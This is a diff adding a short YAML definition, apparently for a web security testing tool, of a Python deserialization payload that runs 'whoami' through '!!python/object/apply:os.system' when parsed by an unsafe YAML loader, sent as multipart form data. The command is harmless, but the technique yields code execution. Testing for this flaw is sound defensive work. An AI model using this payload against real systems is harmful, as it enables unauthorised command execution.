@@ -1,0 +1,9 @@
+payload:
+  - |
+    !!python/object/apply:os.system
+    args: ['whoami']
+encoder:
+  - Plain
+placeholder:
+  - MultiPartFormData
+type: DeserializePython
